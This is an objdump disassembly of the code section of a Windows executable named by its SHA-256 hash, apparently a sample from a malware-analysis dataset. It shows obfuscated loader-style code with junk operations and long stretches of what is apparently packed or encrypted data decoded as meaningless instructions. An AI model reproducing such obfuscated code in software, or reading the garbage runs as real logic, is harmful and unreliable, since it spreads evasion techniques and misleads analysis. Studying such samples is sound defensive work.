
d9640c5e31f9c5ac5a8479c6f479de1c32e59e9da3d67922d9b32cc17d6169c8.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x38
  401006:	mov    eax,0x5a3fc9e
  40100b:	mov    DWORD PTR ds:0x434429,0x7186
  401015:	mov    DWORD PTR [ebp-0x20],eax
  401018:	mov    ecx,DWORD PTR [ebp-0x20]
  40101b:	mov    DWORD PTR ds:0x43439e,0x6cee
  401025:	mov    DWORD PTR [ebp-0x24],0x4ec5
  40102c:	mov    DWORD PTR ds:0x4326f0,0x6120
  401036:	cmp    ecx,eax
  401038:	mov    DWORD PTR ds:0x43441d,0x7018
  401042:	jne    0x4019f7
  401048:	mov    ax,WORD PTR [ebp-0x24]
  40104c:	push   esi
  40104d:	mov    DWORD PTR ds:0x4326fc,0x1b
  401057:	cmp    DWORD PTR ds:0x4326fc,0x0
  40105e:	je     0x40108e
  401064:	cmp    DWORD PTR ds:0x4326fc,0x22
  40106b:	jne    0x40107c
  401071:	push   0x432dc2
  401076:	call   DWORD PTR ds:0x4329b2
  40107c:	mov    ecx,DWORD PTR ds:0x4326fc
  401082:	dec    ecx
  401083:	mov    DWORD PTR ds:0x4326fc,ecx
  401089:	jmp    0x401057
  40108e:	mov    ecx,0x8a3e
  401093:	mov    DWORD PTR ds:0x43438a,0x48c
  40109d:	xor    ax,cx
  4010a0:	add    DWORD PTR ds:0x434419,0x61ba
  4010aa:	mov    ecx,DWORD PTR [ebp+0x8]
  4010ad:	xor    esi,DWORD PTR ds:0x434396
  4010b3:	push   edi
  4010b4:	mov    DWORD PTR ds:0x43437a,0x1c
  4010be:	cmp    DWORD PTR ds:0x43437a,0x0
  4010c5:	je     0x401105
  4010cb:	cmp    DWORD PTR ds:0x43437a,0x25
  4010d2:	jne    0x4010f3
  4010d8:	push   0x38d9
  4010dd:	push   DWORD PTR [ebp-0xc]
  4010e0:	push   0x7b63
  4010e5:	push   0x618f
  4010ea:	push   DWORD PTR [ebp-0x28]
  4010ed:	call   DWORD PTR ds:0x4329b6
  4010f3:	mov    edi,DWORD PTR ds:0x43437a
  4010f9:	dec    edi
  4010fa:	mov    DWORD PTR ds:0x43437a,edi
  401100:	jmp    0x4010be
  401105:	mov    edi,0x3b04
  40110a:	xor    DWORD PTR ds:0x432700,edx
  401110:	add    ax,di
  401113:	add    DWORD PTR ds:0x43439a,0xf3f
  40111d:	movzx  eax,ax
  401120:	add    DWORD PTR ds:0x4326f4,edi
  401126:	not    eax
  401128:	or     esi,DWORD PTR ds:0x434411
  40112e:	and    eax,DWORD PTR [ecx]
  401130:	movzx  ecx,WORD PTR ds:0x432dc2
  401137:	xor    DWORD PTR ds:0x432de6,ecx
  40113d:	mov    ecx,DWORD PTR [ebp+0x8]
  401140:	sub    DWORD PTR ds:0x434425,ecx
  401146:	mov    DWORD PTR [ecx],eax
  401148:	adc    ecx,0x6b0b
  40114e:	mov    ecx,0x7510855
  401153:	sbb    esi,DWORD PTR ds:0x432dda
  401159:	mov    esi,0x32729c
  40115e:	sbb    DWORD PTR ds:0x434425,0x3918
  401168:	push   ebx
  401169:	or     DWORD PTR ds:0x4343a2,ebx
  40116f:	mov    ax,WORD PTR [ebp-0x24]
  401173:	dec    ebx
  401174:	movzx  eax,ax
  401177:	mov    DWORD PTR [ebp-0x38],eax
  40117a:	sub    eax,0x1c8b
  40117f:	mov    eax,DWORD PTR [ebp+0x8]
  401182:	mov    DWORD PTR [ebp-0x28],eax
  401185:	xor    eax,eax
  401187:	or     eax,DWORD PTR ds:0x432dce
  40118d:	add    DWORD PTR ds:0x434376,eax
  401193:	mov    DWORD PTR [ebp-0x8],0xf89c8530
  40119a:	mov    DWORD PTR [ebp-0x14],0xf89c8531
  4011a1:	mov    eax,0x9577
  4011a6:	or     DWORD PTR ds:0x43439a,0x2325
  4011b0:	mov    WORD PTR [ebp-0x4],ax
  4011b4:	movzx  ebx,BYTE PTR ds:0x4326f4
  4011bb:	or     DWORD PTR ds:0x4326f0,ebx
  4011c1:	lea    eax,[ebp-0x30]
  4011c4:	mov    DWORD PTR [ebp-0x34],eax
  4011c7:	mov    eax,DWORD PTR [ebp-0x28]
  4011ca:	mov    DWORD PTR [ebp-0x2c],eax
  4011cd:	add    DWORD PTR ds:0x434419,0x693e
  4011d7:	lea    eax,[ebp-0x18]
  4011da:	and    DWORD PTR ds:0x43436a,0x0
  4011e4:	jmp    0x4011f6
  4011e9:	mov    ebx,DWORD PTR ds:0x43436a
  4011ef:	inc    ebx
  4011f0:	mov    DWORD PTR ds:0x43436a,ebx
  4011f6:	cmp    DWORD PTR ds:0x43436a,0x18
  4011fd:	jae    0x40123a
  401203:	cmp    DWORD PTR ds:0x43436a,0x8
  40120a:	jne    0x40121b
  401210:	push   0x7a50
  401215:	call   DWORD PTR ds:0x4329ba
  40121b:	cmp    DWORD PTR ds:0x43436a,0x7
  401222:	jne    0x401235
  401228:	mov    ebx,DWORD PTR ds:0x43436a
  40122e:	inc    ebx
  40122f:	mov    DWORD PTR ds:0x43436a,ebx
  401235:	jmp    0x4011e9
  40123a:	mov    DWORD PTR [ebp-0x1c],eax
  40123d:	mov    eax,DWORD PTR [ebp-0x1c]
  401240:	mov    DWORD PTR [eax],0xf89f2da9
  401246:	mov    eax,DWORD PTR [ebp-0x14]
  401249:	mov    ebx,DWORD PTR [ebp-0x8]
  40124c:	and    DWORD PTR ds:0x434415,0x66ce
  401256:	xor    eax,ecx
  401258:	xor    ebx,ecx
  40125a:	and    DWORD PTR ds:0x434419,0x3a0f
  401264:	xor    edx,edx
  401266:	and    DWORD PTR ds:0x432de6,0x4326f0
  401270:	add    eax,esi
  401272:	mov    DWORD PTR ds:0x43441d,0x1b71
  40127c:	add    ebx,esi
  40127e:	div    ebx
  401280:	mov    DWORD PTR ds:0x434376,0x5747
  40128a:	mov    edx,DWORD PTR [ebp-0x2c]
  40128d:	mov    DWORD PTR ds:0x4326f4,0x57da
  401297:	cmp    eax,DWORD PTR [edx]
  401299:	mov    DWORD PTR ds:0x434382,0x6b31
  4012a3:	je     0x4019ca
  4012a9:	mov    DWORD PTR [ebp-0xc],0x705fd8f
  4012b0:	lea    eax,[ebp-0xc]
  4012b3:	sbb    edx,DWORD PTR ds:0x432dca
  4012b9:	mov    DWORD PTR [ebp-0x10],eax
  4012bc:	mov    eax,DWORD PTR [ebp-0x10]
  4012bf:	jmp    0x401447
  4012c4:	popa   
  4012c5:	xchg   BYTE PTR ds:0x6151e949,cl
  4012cb:	mov    dh,0x3f
  4012cd:	mov    ah,0xd5
  4012cf:	mov    dl,0xa8
  4012d1:	inc    esp
  4012d2:	mov    cl,0x36
  4012d4:	jo     0x401346
  4012d6:	jo     0x401348
  4012d8:	in     eax,0x7f
  4012da:	jo     0x40134c
  4012dc:	rcl    bh,0x3d
  4012df:	aad    0x39
  4012e1:	ror    edi,cl
  4012e3:	rol    eax,1
  4012e5:	pop    es
  4012e6:	push   es
  4012e7:	add    ecx,DWORD PTR [edi]
  4012e9:	je     0x4012ed
  4012eb:	rdpmc  
  4012ed:	cmpps  xmm3,XMMWORD PTR [edx],0xc7
  4012f1:	adc    bl,BYTE PTR [edi]
  4012f3:	mov    ecx,0xddb7025a
  4012f8:	add    bh,ch
  4012fa:	mov    ebp,0x8003c8db
  4012ff:	sbb    BYTE PTR [eax+0x1541a4f6],dh
  401305:	lods   eax,DWORD PTR ds:[esi]
  401306:	sar    BYTE PTR [eax+0x6fee581f],1
  40130c:	or     edx,DWORD PTR [ecx]
  40130e:	sahf   
  40130f:	jp     0x4012d9
  401311:	inc    edx
  401312:	lods   al,BYTE PTR ds:[esi]
  401313:	push   ebx
  401314:	sub    eax,0xad3ec6d1
  401319:	mov    WORD PTR [ebx-0x3b],?
  40131c:	stos   DWORD PTR es:[edi],eax
  40131d:	js     0x4012e5
  40131f:	rol    DWORD PTR [ecx+0x3992c8f9],cl
  401325:	jmp    0x401359
  401327:	mov    ebp,ecx
  401329:	dec    edi
  40132a:	fcomp  DWORD PTR [eax-0x656800bf]
  401330:	pop    es
  401331:	test   eax,0xed4dbddc
  401336:	sub    BYTE PTR [ebp+0x23],dl
  401339:	mov    ah,0xec
  40133b:	pusha  
  40133c:	nop
  40133d:	mov    esi,0x94c3117b
  401342:	and    esi,edx
  401344:	jmp    0x401396
  401346:	(bad)  
  401347:	out    0xba,al
  401349:	repnz in al,dx
  40134b:	xchg   esp,eax
  40134c:	xor    edi,ecx
  40134e:	jbe    0x4013b5
  401350:	xlat   BYTE PTR ds:[ebx]
  401351:	and    cl,ch
  401353:	add    al,0xd9
  401355:	adc    DWORD PTR [ecx-0x68],edx
  401358:	xor    eax,0x7a616f03
  40135d:	or     dh,BYTE PTR [ecx]
  40135f:	fld    QWORD PTR [eax+0x7f752a56]
  401365:	xor    BYTE PTR [edi+0xba8db0c],cl
  40136b:	pop    ebx
  40136c:	push   ebp
  40136d:	(bad)  
  40136f:	or     ebx,edx
  401371:	pop    esi
  401372:	fstp   DWORD PTR [ecx]
  401374:	jno    0x401306
  401376:	mov    eax,0x2b15374b
  40137b:	ja     0x4013a6
  40137d:	sbb    al,0xd3
  40137f:	xor    BYTE PTR [edi-0x16],cl
  401382:	int    0xa6
  401384:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401385:	ds out dx,al
  401387:	rol    BYTE PTR [esi],cl
  401389:	test   al,0x86
  40138b:	jb     0x40140b
  40138d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40138e:	retf   
  40138f:	mov    ch,BYTE PTR [ecx-0x4e6fcb4b]
  401395:	pop    ebp
  401396:	xchg   ecx,edx
  401398:	cmp    ebp,DWORD PTR [esi]
  40139a:	sub    ah,BYTE PTR [ebp+0x72]
  40139d:	mov    al,0xc7
  40139f:	sub    bl,BYTE PTR [eax-0x4c]
  4013a2:	inc    ecx
  4013a3:	adc    al,0xa
  4013a5:	cmp    DWORD PTR cs:[esi-0x7887d0b2],ebx
  4013ac:	dec    ebx
  4013ad:	in     eax,dx
  4013ae:	and    bh,BYTE PTR ds:0x6700f19f
  4013b4:	mov    cl,0xa2
  4013b6:	xchg   edi,eax
  4013b7:	dec    ecx
  4013b8:	popf   
  4013b9:	add    eax,DWORD PTR [ecx]
  4013bb:	gs sub al,0xb4
  4013be:	xor    al,0x35
  4013c0:	mov    eax,cs
  4013c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4013c3:	inc    eax
  4013c4:	inc    edx
  4013c5:	push   ebx
  4013c6:	mov    esi,DWORD PTR [ebx]
  4013c8:	arpl   WORD PTR [eax-0x13f0c028],di
  4013ce:	in     eax,dx
  4013cf:	int3   
  4013d0:	jp     0x4013fc
  4013d2:	mov    dh,0x78
  4013d4:	imul   eax,DWORD PTR [ebp+ebp*2+0x3f41f13],0x6b5140f
  4013df:	sbb    al,0xde
  4013e1:	dec    ebp
  4013e2:	dec    eax
  4013e3:	or     ebx,eax
  4013e5:	aad    0x12
  4013e7:	mov    edi,0x1a3559aa
  4013ec:	mov    DWORD PTR [ebx-0x5e],ecx
  4013ef:	add    BYTE PTR [ecx+0x3080e71b],ch
  4013f5:	xor    ebx,eax
  4013f7:	sub    eax,0x96d93d39
  4013fc:	arpl   WORD PTR [ebx-0x4e],bx
  4013ff:	jecxz  0x40138b
  401401:	dec    BYTE PTR [esi-0x58e48992]
  401407:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401408:	les    ebp,FWORD PTR [eax-0x2b]
  40140b:	adc    eax,0xbe165a06
  401410:	xchg   ebp,eax
  401411:	xchg   ecx,eax
  401412:	mov    bl,0xc5
  401414:	mov    edx,0x9dcf1299
  401419:	pop    ecx
  40141a:	aam    0xb4
  40141c:	(bad)  
  40141e:	inc    ebp
  40141f:	push   ss
  401420:	dec    esi
  401421:	jmp    0x9fb9:0x44f5f13c
  401428:	cmp    eax,0x8eff7074
  40142d:	loop   0x40146a
  40142f:	xchg   esi,eax
  401430:	das    
  401431:	pop    ecx
  401432:	sub    esi,ecx
  401434:	ror    DWORD PTR [esi+0x60116413],1
  40143a:	mov    dh,dh
  40143c:	das    
  40143d:	cs es cmp eax,0x5bbde9d
  401444:	pop    ecx
  401445:	xor    bh,BYTE PTR [esi-0x2d96ef75]
  40144b:	in     al,dx
  40144c:	test   eax,0x1089f89e
  401451:	mov    eax,DWORD PTR [ebp-0xc]
  401454:	cmp    eax,0x742b26d4
  401459:	jmp    0x4015e1
  40145e:	push   ds
  40145f:	fcmovnb st,st(2)
  401461:	mov    edx,0x5ba661c1
  401466:	xlat   BYTE PTR ds:[ebx]
  401467:	les    ecx,FWORD PTR [esi]
  401469:	test   DWORD PTR [edi-0x1a0e9cfc],ebx
  40146f:	jg     0x4014e1
  401471:	jo     0x401458
  401473:	jg     0x4014e5
  401475:	jo     0x4013fd
  401477:	std    
  401478:	(bad)  
  401479:	(bad)  
  40147b:	nop
  40147c:	jl     0x401454
  40147e:	call   0xb98f:0xe734eea6
  401485:	dec    esp
  401486:	inc    esi
  401487:	cmc    
  401488:	rcl    ebx,1
  40148a:	ror    BYTE PTR [eax],0x3a
  40148d:	add    eax,0xe847f32e
  401492:	or     DWORD PTR [ebp-0x78],ebx
  401495:	lea    esp,[edx]
  401497:	xor    eax,0xc71f6dcf
  40149c:	inc    eax
  40149d:	xor    dh,BYTE PTR ss:[eax]
  4014a0:	ins    DWORD PTR es:[edi],dx
  4014a1:	lea    esi,[edi-0x2d57fa9d]
  4014a7:	xor    esi,esp
  4014a9:	stc    
  4014aa:	and    edx,DWORD PTR [edi]
  4014ac:	clc    
  4014ad:	fwait
  4014ae:	and    ebp,ebp
  4014b0:	cmp    eax,0xb7889591
  4014b5:	ds fs xchg eax,ebx
  4014b9:	hlt    
  4014ba:	je     0x401485
  4014bc:	fwait
  4014bd:	loopne 0x4014cd
  4014bf:	rol    DWORD PTR [ebx-0x283e7811],1
  4014c5:	stos   DWORD PTR es:[edi],eax
  4014c6:	(bad)  
  4014c7:	jnp    0x40145f
  4014c9:	fcmovbe st,st(4)
  4014cb:	inc    ebx
  4014cc:	and    DWORD PTR [ebx-0x279c2449],ecx
  4014d2:	bnd jne 0x401547
  4014d5:	dec    eax
  4014d6:	out    dx,al
  4014d7:	add    al,dh
  4014d9:	popa   
  4014da:	into   
  4014db:	xor    esi,DWORD PTR [edx]
  4014dd:	adc    al,0xec
  4014df:	adc    al,0xb0
  4014e1:	pop    esi
  4014e2:	mov    ebx,0x6dbbb243
  4014e7:	outs   dx,BYTE PTR ds:[esi]
  4014e8:	sbb    al,0xa
  4014ea:	mov    al,ds:0x2cce06fb
  4014ef:	sbb    cl,BYTE PTR [edx-0x2b1a6a42]
  4014f5:	std    
  4014f6:	mov    ch,0x78
  4014f8:	xchg   BYTE PTR [ebp+0x0],dh
  4014fb:	aas    
  4014fc:	std    
  4014fd:	cld    
  4014fe:	cmp    DWORD PTR [esi-0x7a],ebx
  401501:	sbb    ah,BYTE PTR [edi-0x37]
  401504:	fbstp  TBYTE PTR [ecx]
  401506:	mov    dh,0x82
  401508:	mov    DWORD PTR [edx-0x5d],eax
  40150b:	sub    BYTE PTR [esi-0x34c4c6ea],dh
  401511:	fdivp  st(5),st
  401513:	call   DWORD PTR ds:0x295ea04e
  401519:	mov    ch,0xd9
  40151b:	jae    0x401571
  40151d:	rcr    BYTE PTR [edx],1
  40151f:	cmp    cl,BYTE PTR [ecx]
  401521:	pop    eax
  401522:	or     eax,0x92a03a
  401527:	out    0x83,al
  401529:	scas   al,BYTE PTR es:[edi]
  40152a:	pop    ss
  40152b:	dec    ecx
  40152c:	(bad)  
  40152d:	mov    edx,0x1a118527
  401532:	into   
  401533:	cwde   
  401534:	sbb    bl,BYTE PTR [ebx+esi*1+0x52126190]
  40153b:	push   edi
  40153c:	adc    ch,dl
  40153e:	dec    DWORD PTR [ecx+0x18]
  401541:	add    BYTE PTR [ecx-0x1c57872d],al
  401547:	sbb    DWORD PTR [edx],edx
  401549:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40154a:	addr16 cmp ebx,eax
  40154d:	push   ss
  40154e:	repz adc esp,edi
  401551:	jg     0x4015d0
  401553:	cwde   
  401554:	aas    
  401555:	mov    esi,0x91e0c279
  40155a:	xchg   ecx,eax
  40155b:	ret    
  40155c:	mov    dh,0xe1
  40155e:	sub    DWORD PTR [ebx+0x62],esi
  401561:	dec    ecx
  401562:	inc    ebp
  401563:	mov    al,ds:0x2cf16cbf
  401568:	cmp    eax,0x9cfae7d2
  40156d:	push   ss
  40156e:	test   eax,0xc09a830
  401573:	(bad)  
  401574:	pop    eax
  401575:	popf   
  401576:	adc    DWORD PTR ds:0xd5851859,esi
  40157c:	cmp    ch,ah
  40157e:	push   es
  40157f:	icebp  
  401580:	nop
  401581:	rcl    BYTE PTR [eax-0x3437b812],0x55
  401588:	rol    BYTE PTR [ecx],cl
  40158a:	push   ebx
  40158b:	jp     0x401607
  40158d:	adc    BYTE PTR ds:0x18d576bf,0x88
  401594:	pusha  
  401595:	out    dx,eax
  401596:	and    al,0x77
  401598:	sub    al,0xf4
  40159a:	lea    edi,[edx-0x9]
  40159d:	mov    cl,0x34
  40159f:	out    0x41,al
  4015a1:	or     BYTE PTR [eax+eax*4],ch
  4015a4:	cmp    al,0x10
  4015a6:	scas   eax,DWORD PTR es:[edi]
  4015a7:	push   edx
  4015a8:	fistp  DWORD PTR [ebx+0x25]
  4015ab:	fcmovnu st,st(1)
  4015ad:	jo     0x4015d9
  4015af:	sar    DWORD PTR [eax+0xd82f3ef],0x86
  4015b6:	mov    ebx,0x77d16f6a
  4015bb:	push   edi
  4015bc:	push   eax
  4015bd:	and    DWORD PTR [ebx-0x44c1f92],esi
  4015c3:	adc    BYTE PTR [edi],dl
  4015c5:	and    ah,bl
  4015c7:	lods   eax,DWORD PTR ds:[esi]
  4015c8:	pop    edx
  4015c9:	mov    esi,0xa574f0e4
  4015ce:	push   esp
  4015cf:	(bad)  
  4015d0:	fidiv  DWORD PTR [ecx+0x5]
  4015d3:	icebp  
  4015d4:	imul   edi,esp,0xffffffe9
  4015d7:	mov    ecx,0x17c1c8c8
  4015dc:	push   ebx
  4015dd:	stos   DWORD PTR es:[edi],eax
  4015de:	push   ds
  4015df:	and    DWORD PTR [eax+0xe840f],esi
  4015e5:	add    BYTE PTR [eax],al
  4015e7:	mov    eax,DWORD PTR [ebp-0x1c]
  4015ea:	or     DWORD PTR [eax],0x60751c9c
  4015f0:	jmp    0x4019d9
  4015f5:	mov    eax,DWORD PTR [ebp-0xc]
  4015f8:	add    eax,DWORD PTR [ebp-0x18]
  4015fb:	cmp    eax,0x6cca547d
  401600:	je     0x401614
  401606:	mov    eax,DWORD PTR [ebp-0x10]
  401609:	and    DWORD PTR [eax],0x751c99
  40160f:	jmp    0x4019d9
  401614:	mov    eax,DWORD PTR [ebp-0xc]
  401617:	mov    edx,DWORD PTR [ebp-0x18]
  40161a:	or     eax,edx
  40161c:	cmp    eax,0xfcbf2ffd
  401621:	je     0x401635
  401627:	mov    eax,DWORD PTR [ebp-0x10]
  40162a:	xor    DWORD PTR [eax],0x2650fa8f
  401630:	jmp    0x4019d9
  401635:	mov    ax,WORD PTR [ebp-0x4]
  401639:	mov    edx,0x8a3e
  40163e:	xor    ax,dx
  401641:	mov    edx,DWORD PTR [ebp-0x28]
  401644:	mov    edx,DWORD PTR [edx]
  401646:	add    ax,di
  401649:	cmp    ax,WORD PTR [edx]
  40164c:	je     0x401821
  401652:	mov    eax,DWORD PTR [ebp-0x14]
  401655:	xor    eax,ecx
  401657:	add    eax,esi
  401659:	mov    DWORD PTR [ebp-0x30],eax
  40165c:	mov    eax,DWORD PTR [ebp-0x34]
  40165f:	mov    dx,WORD PTR [ebp-0x38]
  401663:	mov    ebx,0x8a3e
  401668:	xor    dx,bx
  40166b:	mov    ebx,DWORD PTR [ebp-0x8]
  40166e:	add    dx,di
  401671:	jmp    0x4017f9
  401676:	clc    
  401677:	repnz sbb eax,0xa851698d
  40167d:	icebp  
  40167e:	pusha  
  40167f:	xchg   ebx,eax
  401680:	rcl    DWORD PTR [ebx+0x54],1
  401683:	mov    ds:0x7e4aa2e5,eax
  401688:	jo     0x4016fa
  40168a:	in     eax,0x7f
  40168c:	jo     0x4016fe
  40168e:	mov    esi,0x95a04264
  401693:	fstp   QWORD PTR [ebp+0x2b]
  401696:	popf   
  401697:	ja     0x4016f4
  401699:	or     DWORD PTR [esi+ebp*4+0x9],0xb
  40169e:	cld    
  40169f:	adc    ebp,esp
  4016a1:	(bad)  
  4016a2:	(bad)  
  4016a3:	sub    edi,DWORD PTR [edx]
  4016a5:	mov    edi,0x45c7c3f4
  4016aa:	jmp    0xd323:0xa1f45f2a
  4016b1:	xchg   ecx,eax
  4016b2:	jo     0x4016be
  4016b4:	dec    ebx
  4016b5:	minps  xmm2,xmm2
  4016b8:	or     dh,BYTE PTR [ecx-0x2f324c7d]
  4016be:	xchg   esp,eax
  4016bf:	sbb    eax,0x9c8ed346
  4016c4:	pushf  
  4016c5:	out    0xd3,al
  4016c7:	adc    esp,DWORD PTR [edi]
  4016c9:	mul    BYTE PTR [edi-0x62]
  4016cc:	shl    DWORD PTR [ecx],cl
  4016ce:	xor    ecx,DWORD PTR [eax+0x11]
  4016d1:	mov    dh,BYTE PTR [esi+eiz*4]
  4016d4:	loope  0x40165b
  4016d6:	jg     0x4016e2
  4016d8:	mov    ebp,0xbcf6fe61
  4016dd:	jns    0x401752
  4016df:	mov    edx,ss
  4016e1:	jecxz  0x4016e7
  4016e3:	jmp    0xb1db2bec
  4016e8:	cmp    bh,BYTE PTR [eax-0x3f83530c]
  4016ee:	push   0x6
  4016f0:	inc    esi
  4016f1:	orps   xmm3,XMMWORD PTR [ecx-0x7687c6b3]
  4016f8:	adc    esp,DWORD PTR [ebx+0x20]
  4016fb:	test   al,0x36
  4016fd:	adc    eax,0x24b14365
  401702:	(bad)  
  401703:	xlat   BYTE PTR ds:[ebx]
  401704:	stos   DWORD PTR es:[edi],eax
  401705:	add    al,0xf3
  401707:	mov    ah,0xc1
  401709:	loop   0x40168e
  40170b:	push   0xeae28a14
  401710:	pop    es
  401711:	stos   BYTE PTR es:[edi],al
  401712:	sub    esp,DWORD PTR [eax]
  401714:	xor    al,0x44
  401716:	adc    esi,ebp
  401718:	mov    ch,BYTE PTR [ebx-0x7e]
  40171b:	mov    dh,0xa3
  40171d:	mov    edx,0xb002bee8
  401722:	out    0xd3,eax
  401724:	jp     0x401786
  401726:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401727:	aam    0x6f
  401729:	out    0x91,eax
  40172b:	es and bl,0x7b
  40172f:	adc    al,0x29
  401731:	xlat   BYTE PTR es:[ebx]
  401733:	loop   0x401773
  401735:	in     eax,dx
  401736:	dec    edx
  401737:	xchg   ebp,eax
  401738:	cmp    ecx,0xffffff9c
  40173b:	cmc    
  40173c:	and    BYTE PTR [eax],ch
  40173e:	sub    al,0x76
  401740:	rcr    DWORD PTR [ecx-0x7055e676],0x7f
  401747:	inc    ecx
  401748:	or     eax,0x73cde91d
  40174d:	test   al,0xf5
  40174f:	mov    fs,WORD PTR [ecx+esi*2+0x335e1be1]
  401756:	imul   edi,DWORD PTR [eax-0x2b],0xffffff95
  40175a:	fs hlt 
  40175c:	popf   
  40175d:	fdivr  st(2),st
  40175f:	scas   eax,DWORD PTR es:[edi]
  401760:	dec    edx
  401761:	test   DWORD PTR ds:0x8b125c2,edx
  401767:	pusha  
  401768:	mov    dh,0x6c
  40176a:	mov    edx,0x2ee98a7b
  40176f:	into   
  401770:	repz or BYTE PTR [eax],bh
  401773:	add    eax,0x7f3b8cfb
  401778:	(bad)  
  401779:	imul   edi,ecx,0xffffffdc
  40177c:	retf   
  40177d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40177e:	jl     0x4017b8
  401780:	lods   eax,DWORD PTR ds:[esi]
  401781:	xchg   DWORD PTR [edx-0x84a0681],ebx
  401787:	dec    esi
  401788:	xchg   ebp,eax
  401789:	iret   
  40178a:	sbb    al,0x97
  40178c:	inc    esi
  40178d:	scas   eax,DWORD PTR es:[edi]
  40178e:	jmp    0x5881:0xd0d7ad6c
  401795:	fsub   st(5),st
  401797:	adc    bl,BYTE PTR ds:0xa79b2ec
  40179d:	jmp    DWORD PTR [ecx-0x48]
  4017a0:	pop    esi
  4017a1:	addr16 or al,0x38
  4017a4:	(bad)  
  4017a5:	mov    dl,0x38
  4017a7:	add    esi,DWORD PTR [ecx+edi*4-0x6a5206be]
  4017ae:	xchg   ebp,eax
  4017af:	std    
  4017b0:	adc    DWORD PTR [ecx+ebx*1-0x2f],ebx
  4017b4:	mul    DWORD PTR [ecx-0x2d]
  4017b7:	es xchg ebx,eax
  4017b9:	sbb    BYTE PTR [esi+0x171bd678],ah
  4017bf:	mov    ebx,0x58d6b2cf
  4017c4:	mov    cl,0x3e
  4017c6:	add    esp,DWORD PTR [eax+esi*4-0x49]
  4017ca:	hlt    
  4017cb:	mov    ebp,0x8a073b15
  4017d0:	sbb    al,0x7b
  4017d2:	mov    dl,0xae
  4017d4:	loope  0x401828
  4017d6:	xchg   esi,eax
  4017d7:	dec    edx
  4017d8:	jmp    0xf5b8:0x9008568d
  4017df:	mov    esp,0x71c6e74d
  4017e4:	popa   
  4017e5:	rol    BYTE PTR [ebx],1
  4017e7:	fs popf 
  4017e9:	mov    ecx,0x11342d7d
  4017ee:	call   0xf9ee:0x69494ef3
  4017f5:	bound  ebx,QWORD PTR [esi-0x48f0627d]
  4017fb:	shl    BYTE PTR [ebx],cl
  4017fd:	(bad)  [ebp+0x729c1a94]
  401803:	xor    al,BYTE PTR [eax]
  401805:	add    DWORD PTR [eax],edx
  401807:	mov    eax,DWORD PTR [ebp-0x2c]
  40180a:	mov    edx,DWORD PTR [ebp-0x8]
  40180d:	mov    ebx,DWORD PTR [ebp-0x30]
  401810:	xor    edx,ecx
  401812:	add    edx,esi
  401814:	imul   edx,ebx
  401817:	sub    DWORD PTR [eax],edx
  401819:	mov    eax,DWORD PTR [ebp-0x14]
  40181c:	jmp    0x4019dc
  401821:	mov    eax,DWORD PTR [ebp-0xc]
  401824:	mov    edx,DWORD PTR [ebp-0x18]
  401827:	jmp    0x4019af
  40182c:	pop    ebx
  40182d:	arpl   di,di
  40182f:	out    dx,eax
  401830:	xchg   ebx,esi
  401832:	imul   esi,DWORD PTR [ebx-0x5d],0x7d
  401836:	jae    0x401839
  401838:	push   ecx
  401839:	or     BYTE PTR [edx+edx*1+0x70707c3f],ah
  401840:	in     eax,0x7f
  401842:	jo     0x4018b4
  401844:	rcl    ch,cl
  401846:	out    dx,al
  401847:	out    0xce,al
  401849:	pop    es
  40184a:	mov    BYTE PTR [esi-0x9],dl
  40184d:	cmp    eax,0xca6910f4
  401852:	(bad)  
  401853:	xlat   BYTE PTR ds:[ebx]
  401854:	jbe    0x4018a0
  401856:	xchg   esp,eax
  401857:	es sub ebx,edi
  40185a:	mov    ecx,0xe3814775
  40185f:	inc    esp
  401860:	cwde   
  401861:	stos   DWORD PTR es:[edi],eax
  401862:	sub    al,0x29
  401865:	sub    edx,esi
  401867:	sub    cl,bl
  401869:	mov    ecx,0x7a1d143a
  40186e:	(bad)  
  40186f:	pop    esp
  401870:	cmp    dh,BYTE PTR [eax-0x10]
  401873:	adc    edx,DWORD PTR [ecx]
  401875:	mov    ds:0xdfe6d747,eax
  40187a:	sub    edi,DWORD PTR [ebp+0x496a1dc0]
  401880:	inc    edx
  401881:	loopne 0x4018a9
  401883:	mov    ebp,esi
  401885:	cmc    
  401886:	dec    edi
  401887:	xor    al,0xc6
  401889:	mov    bl,0xfa
  40188b:	xor    esp,0x46215203
  401891:	aam    0xea
  401893:	xchg   esi,eax
  401894:	adc    DWORD PTR [esi-0x47],0xca062bd0
  40189b:	push   ds
  40189c:	mov    al,BYTE PTR [ecx-0x344025e1]
  4018a2:	lods   al,BYTE PTR ds:[esi]
  4018a3:	out    dx,al
  4018a4:	hlt    
  4018a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4018a6:	adc    eax,0x239e8a9b
  4018ab:	je     0x4018f0
  4018ad:	(bad)  
  4018ae:	cmp    ebx,DWORD PTR [ebx-0x57]
  4018b1:	mov    ds:0xb5bcedb3,al
  4018b6:	cdq    
  4018b7:	push   esp
  4018b8:	push   eax
  4018b9:	pop    eax
  4018ba:	test   DWORD PTR [edx-0x35817956],ecx
  4018c0:	sbb    edi,DWORD PTR [ecx-0x2a45e3ea]
  4018c6:	fadd   st(0),st
  4018c8:	add    DWORD PTR [esi+0x4d5fb5ba],ecx
  4018ce:	loopne 0x401870
  4018d0:	test   al,0x90
  4018d2:	xrelease mov DWORD PTR [eax+0x6],esi
  4018d6:	push   ebp
  4018d7:	inc    edx
  4018d8:	(bad)  
  4018d9:	mov    ds:0x42609df8,al
  4018de:	hlt    
  4018df:	lea    edx,[ecx-0x13]
  4018e2:	imul   eax,esi,0x5
  4018e5:	jbe    0x40192c
  4018e7:	outs   dx,BYTE PTR ds:[esi]
  4018e8:	fisubr DWORD PTR [esi+0x25f1f53e]
  4018ee:	inc    esp
  4018ef:	adc    cl,BYTE PTR [ebp+0x12]
  4018f2:	(bad)  
  4018f4:	xor    ebp,DWORD PTR [eax+0x4cf2001c]
  4018fa:	cli    
  4018fb:	pop    ss
  4018fc:	push   ebx
  4018fd:	das    
  4018fe:	int    0x1a
  401900:	das    
  401901:	fdivr  DWORD PTR [ebp+ebx*2+0xf]
  401905:	imul   eax,DWORD PTR [esi],0x3a
  401908:	adc    al,0xa0
